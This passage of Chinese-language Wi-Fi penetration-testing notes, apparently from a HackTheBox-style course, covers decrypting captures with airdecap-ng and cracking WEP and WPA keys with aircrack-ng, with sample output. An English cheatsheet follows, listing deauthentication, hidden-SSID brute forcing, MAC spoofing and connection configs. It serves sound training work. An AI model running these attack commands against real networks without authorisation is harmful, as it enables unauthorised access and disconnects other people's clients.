
在上面的输出中，可以看到发送解除认证数据包后，客户端断开连接然后重新连接。这由 `Lost` 数据包数量和 `Frames` 计数增加所证明。

此外，`airodump-ng` 会捕获一个四次握手（four-way handshake），如输出中所示。通过在 airodump-ng 中使用 `-w` 选项，可以将捕获的 WPA 握手保存到 `.pcap` 文件中。此文件随后可用于像 aircrack-ng 这样的工具来破解预共享密钥 (PSK)。`[ WPA handshake: 00:14:6C:7A:41:81]`是必须的。如果没有出现这个，那就无法进行破解。

### Airdecap-ng

Airdecap-ng 是一个有价值的工具，一旦获取了网络的密钥，就可用于解密无线捕获文件。它可以解密 WEP、WPA PSK 和 WPA2 PSK。

- 从开放网络捕获（未加密捕获）中移除无线头部。
- 使用十六进制 WEP 密钥解密 WEP 加密捕获文件。
- 使用预共享密码解密 WPA/WPA2 加密捕获文件。

用法：`airdecap-ng [options] <pcap file>`

| **选项** |                   **描述**                    |
| :----: | :-----------------------------------------: |
|   -l   |                不移除 802.11 头部                |
|   -b   |                接入点 MAC 地址过滤器                |
|   -k   | WPA/WPA2 成对主密钥 (Pairwise Master Key)，十六进制格式 |
|   -e   |           目标网络 ASCII 标识符 (ESSID)            |
|   -p   |      目标网络 WPA/WPA2 预共享密码 (passphrase)       |
|   -w   |             目标网络 WEP 密钥，十六进制格式              |

Airdecap-ng 生成一个新文件，其后缀为 `-dec.cap`。

在使用 airdecap-ng 解密后的捕获文件中，可以看到 "Protocol" 选项卡显示了正确的协议，例如 ARP、TCP、DHCP、HTTP 等。此外，注意 "Info" 选项卡提供了更详细的信息，并且正确显示了源和目标 IP 地址。

#### 从未加密捕获文件中移除无线头部

在开放网络上捕获数据包会生成一个未加密的捕获文件。它可能包含许多与我们的分析无关的帧。为了精简数据，可以使用 airdecap-ng 消除未加密捕获文件中的无线头部。

可以使用以下命令：`airdecap-ng -b <bssid> <capture-file>`

将 `<bssid>` 替换为接入点的 MAC 地址，将 `<capture-file>` 替换为捕获文件的名称。

```bash
sudo airdecap-ng -b 00:14:6C:7A:41:81 opencapture.cap
Total number of stations seen            0
Total number of packets read           251
Total number of WEP data packets         0
Total number of WPA data packets         0
Number of plaintext data packets         0
Number of decrypted WEP  packets         0
Number of corrupted WEP  packets         0
Number of decrypted WPA  packets         0
Number of bad TKIP (WPA) packets         0
Number of bad CCMP (WPA) packets         0
```

这将生成一个后缀为 `-dec.cap` 的解密文件，例如 `opencapture-dec.cap`，其中包含已精简的数据，可供进一步分析。

#### 解密 WEP 加密捕获

一旦获取了十六进制 WEP 密钥，就可以用它来解密捕获的数据包。

要使用 Airdecap-ng 解密 WEP 加密捕获文件，可以使用以下命令：`airdecap-ng -w <WEP-key> <capture-file>`

将 `<WEP-key>` 替换为十六进制 WEP 密钥，将 `<capture-file>` 替换为捕获文件的名称。

```bash
sudo airdecap-ng -w 1234567890ABCDEF WIFI-01.cap
Total number of stations seen            6
Total number of packets read           356
Total number of WEP data packets       235
Total number of WPA data packets       121
Number of plaintext data packets         0
Number of decrypted WEP  packets         0
Number of corrupted WEP  packets         0
Number of decrypted WPA  packets       235
Number of bad TKIP (WPA) packets         0
Number of bad CCMP (WPA) packets         0
```

这将生成一个后缀为 `-dec.cap` 的解密文件。

#### 解密 WPA 加密捕获

Airdecap-ng 也可以解密 WPA 加密捕获文件，前提是拥有预共享密码。

可以使用以下命令：`airdecap-ng -p <passphrase> <capture-file> -e <essid>`

将 `<passphrase>` 替换为 WPA 预共享密码，将 `<capture-file>` 替换为捕获文件的名称，将 `<essid>` 替换为相应网络的 ESSID 名称。

```bash
sudo airdecap-ng -p 'abdefg' WIFI-01.cap -e "THE ESSID"
Total number of stations seen            6
Total number of packets read           356
Total number of WEP data packets       235
Total number of WPA data packets       121
Number of plaintext data packets         0
Number of decrypted WEP  packets         0
Number of corrupted WEP  packets         0
Number of decrypted WPA  packets       121
Number of bad TKIP (WPA) packets         0
Number of bad CCMP (WPA) packets         0
```

这将生成一个后缀为 `-dec.cap` 的解密文件。
### Aircrack-ng

Aircrack-ng 是一个功能强大的网络安全测试工具，能够破解使用预共享密钥或 PMKID 的 WEP 和 WPA/WPA2 网络。Aircrack-ng 是一个离线攻击工具，因为它处理捕获的数据包，无需与任何 Wi-Fi 设备直接交互。

####  基准测试

在开始使用 Aircrack-ng 进行密码破解之前，评估主机系统的基准性能至关重要，以确保其能够有效执行暴力破解攻击。Aircrack-ng 具有基准测试模式，用于测试 CPU 性能。

```bash
aircrack-ng -S
1628.101 k/s
```

以上输出估计 CPU 每秒可以破解约 1,628.101 个密码。

#### 破解 WEP

一旦使用 Airodump-ng 捕获了足够数量的加密数据包，Aircrack-ng 就能够恢复 WEP 密钥。可以使用 Airodump-ng 的 `--ivs` 选项仅保存捕获的` IV（Initialization Vectors，初始化向量）`。捕获足够的 IV 后，可以使用 `Aircrack-ng` 的 `-K` 选项，它会调用 `Korek WEP `破解方法来破解 WEP 密钥。

```bash
aircrack-ng -K WIFI.ivs
Reading packets, please wait...
Opening WIFI.ivs
Read 567298 packets.   #  BSSID              ESSID                     Encryption   1  D2:13:94:21:7F:1A                            WEP (0 IVs)

Choosing first network as target.

Reading packets, please wait...
Opening WIFI.ivs
Read 567298 packets.

1 potential targets

                                             Aircrack-ng 1.6


                               [00:00:17] Tested 1741 keys (got 566693 IVs)

   KB    depth   byte(vote)
    0    0/  1   EB(  50) 11(  20) 71(  20) 0D( 12) 10( 12) 68( 12) 84( 12) 0A(   9)
    1    1/  2   C8(  31) BD(  18) F8(  17) E6(  16) 35(  15) 7A(  13) 7F(  13) 81(  13)
    2    0/  3   7F(  31) 74(  24) 54(  17) 1C(  13) 73(  13) 86(  12) 1B(  10) BF(  10)
    3    0/  1   3A( 148) EC(  20) EB(  16) FB(  13) 81(  12) D7(  12) ED(  12) F0(  12)
    4    0/  1   03( 140) 90(  31) 4A(  15) 8F(  14) E9(  13) AD(  12) 86(  10) DB(  10)
    5    0/  1   D0(  69) 04(  27) 60(  24) C8(  24) 26(  20) A1(  20) A0(  18) 4F(  17)
    6    0/  1   AF( 124) D4(  29) C8(  20) EE(  18) 3F(  12) 54(  12) 3C(  11) 90(  11)
    7    0/  1   DA( 168) 90(  24) 72(  22) F5(  21) 11(  20) F1(  20) 86(  17) FB(  16)
    8    0/  1   F6( 157) EE(  24) 66(  20) DA(  18) E0(  18) EA(  18) 82(  17) 11(  16)
    9    1/  2   7B(  44) E2(  30) 11(  27) DE(  23) A4(  20) 66(  19) E9(  18) 64(  17)
   10    1/  1   01(   0) 02(   0) 03(   0) 04(   0) 05(   0) 06(   0) 07(   0) 08(   0)

             KEY FOUND! [ EB:C8:7F:3A:03:D0:AF:DA:F6:8D:A5:E2:C7 ]
	Decrypted correctly: 100%
```

#### 破解 WPA

一旦使用 Airodump-ng 捕获到“四次握手”，Aircrack-ng 就能够破解 WPA 密钥。要破解 WPA/WPA2 预共享密钥，只能使用基于字典的方法，这需要一个包含潜在密码的词典。一个“四次握手”作为必要的输入。对于 WPA 握手，完整的握手包含四个数据包。然而，Aircrack-ng 仅用两个数据包也能有效工作。具体来说，EAPOL 数据包 2 和 3，或数据包 3 和 4，被视为完整握手。

```bash
aircrack-ng WIFI.pcap -w /opt/wordlist.txt
Reading packets, please wait...
Opening WIFI.pcap
Read 1093 packets.   #  BSSID              ESSID                     Encryption   1  2D:0C:51:12:B2:33  WIFI-Wireless              WPA (1 handshake, with PMKID)
   2  DA:28:A7:B7:30:84                            Unknown
   3  53:68:F7:B7:51:B9                            Unknown
   4  95:D1:46:23:5A:DD                            Unknown



Index number of target network ? 1

Reading packets, please wait...
Opening WIFI.pcap
Read 1093 packets.

1 potential targets

                               Aircrack-ng 1.6

      [00:00:00] 802/14344392 keys tested (2345.32 k/s)

      Time left: 1 hour, 41 minutes, 55 seconds                  0.01%

                           KEY FOUND! [ WIFI@123 ]


      Master Key     : A2 88 FC F0 CA AA CD A9 A9 F5 86 33 FF 35 E8 99
                       2A 01 D9 C1 0B A5 E0 2E FD F8 CB 5D 73 0C E7 BC

      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00

      EAPOL HMAC     : A4 62 A7 02 9A D5 BA 30 B6 AF 0D F3 91 98 8E 45
```
## Cheetsheet
#### Interfaces

|                                              Command                                              |            Description             |
| :-----------------------------------------------------------------------------------------------: | :--------------------------------: |
|                                       `sudo iw reg set US`                                        |   Set Region for the Interface.    |
|  `sudo ifconfig wlan0 down`  <br>`sudo iwconfig wlan0 txpower 30`  <br>`sudo ifconfig wlan0 up`   |   Change the Interface Strength.   |
|                                `iwlist wlan0 scan \| grep 'Cell\\                                 |             Quality\\              |
|  `sudo ifconfig wlan0 down`  <br>`sudo iwconfig wlan0 channel 64`  <br>`sudo ifconfig wlan0 up`   |   Change the Interface Channel.    |
| `sudo ifconfig wlan0 down`  <br>`sudo iwconfig wlan0 freq "5.52G"`  <br>`sudo ifconfig wlan0 up`  |  Change the Interface Frequency.   |
| `sudo ifconfig wlan0 down`  <br>`sudo iwconfig wlan0 mode managed`  <br>`sudo ifconfig wlan0 up`  | Set the Interface to Managed Mode. |
|            `sudo iwconfig wlan0 mode ad-hoc`  <br>`sudo iwconfig wlan0 essid WIFI-Mesh`            | Set the Interface to Ad-hoc Mode.  |
|                                 `sudo iw dev wlan0 set type mesh`                                 |  Set the Interface to Mesh Mode.   |
| `sudo ifconfig wlan0 down`  <br>`sudo iw wlan0 set monitor control`  <br>`sudo ifconfig wlan0 up` | Set the Interface to Monitor Mode. |

### Aircrack-ng

|                                Command                                |                                       Description                                        |
| :-------------------------------------------------------------------: | :--------------------------------------------------------------------------------------: |
|                     `sudo airmon-ng start wlan0`                      |                           Start Monitor mode using airmon-ng.                            |
|                    `sudo airmon-ng start wlan0 11`                    |                 Start Monitor mode using airmon-ng on specific channel.                  |
|                      `sudo airodump-ng wlan0mon`                      |                     Scan Available WiFi Networks using airodump-ng.                      |
|                   `sudo airodump-ng -c 11 wlan0mon`                   | Scan Available WiFi Networks using airodump-ng on Specific Channels or a Single Channel. |
|                 `sudo airodump-ng wlan0mon --band a`                  |                                 Scan 5 GHz Wi-Fi bands.                                  |
|                  `sudo airodump-ng wlan0mon -w WIFI`                   |                          Save the airodump-ng output to a file.                          |
|          `airgraph-ng -i WIFI-01.csv -g CAPR -o WIFI_CAPR.png`          |                            Clients to AP Relationship Graph.                             |
|           `airgraph-ng -i WIFI-01.csv -g CPG -o WIFI_CPG.png`           |                                   Common Probe Graph.                                    |
|                  `sudo aireplay-ng --test wlan0mon`                   |                                Test for Packet Injection.                                |
| `aireplay-ng -0 5 -a 00:14:6C:7A:41:81 -c 00:0F:B5:32:31:31 wlan0mon` |                        Perform Deauthentication using Aireplay-ng                        |
|             `airdecap-ng -w 1234567890ABCDEF WIFI-01.cap`              |                             Decrypt WEP-encrypted captures.                              |
|                       `aircrack-ng -K WIFI.ivs`                        |                             Cracking WEP using aircrack-ng.                              |
|              `aircrack-ng WIFI.pcap -w /opt/wordlist.txt`              |                             Cracking WPA using aircrack-ng.                              |

### Connection

|                                                                                                Command                                                                                                |            Description             |
| :---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: | :--------------------------------: |
|              `network={`  <br>   `ssid="HackTheBox"`  <br>   `key_mgmt=NONE`  <br>   `wep_key0=3C1C3A3BAB`  <br>   `wep_tx_keyidx=0`  <br>`}`  <br>`wpa_supplicant -c wep.conf -i wlan0`              |      Connect to WEP Networks       |
|                                          `network={`  <br>   `ssid="HackMe"`  <br>   `psk="password123"`  <br>`}`  <br>`wpa_supplicant -c wpa.conf -i wlan0`                                          |  Connect to WPA Personal Networks  |
| `network={`  <br>   `ssid="WIFI-Corp"`  <br>   `key_mgmt=WPA-EAP`  <br>   `identity="WIFI\Administrator"`  <br>   `password="Admin@123"`  <br>`}`  <br>`wpa_supplicant -c wpa_enterprsie.conf -i wlan0` | Connect to WPA Enterprise Networks |

### Basic Control Bypass

|                                                  Command                                                  |                   Description                   |
| :-------------------------------------------------------------------------------------------------------: | :---------------------------------------------: |
|                             `mdk3 wlan0mon p -b u -c 1 -t A2:FF:31:2C:B1:C4`                              | Bruteforce Hidden SSID for all possible values. |
|                        `mdk3 wlan0mon p -f /opt/wordlist.txt -t D2:A3:32:13:29:D5`                        |    Bruteforce Hidden SSID using a Wordlist.     |
| `airmon-ng stop wlan0mon`  <br>`sudo macchanger wlan0 -m 3E:48:72:B7:62:2A`  <br>`sudo ifconfig wlan0 up` |    Change the MAC address of the interface.     |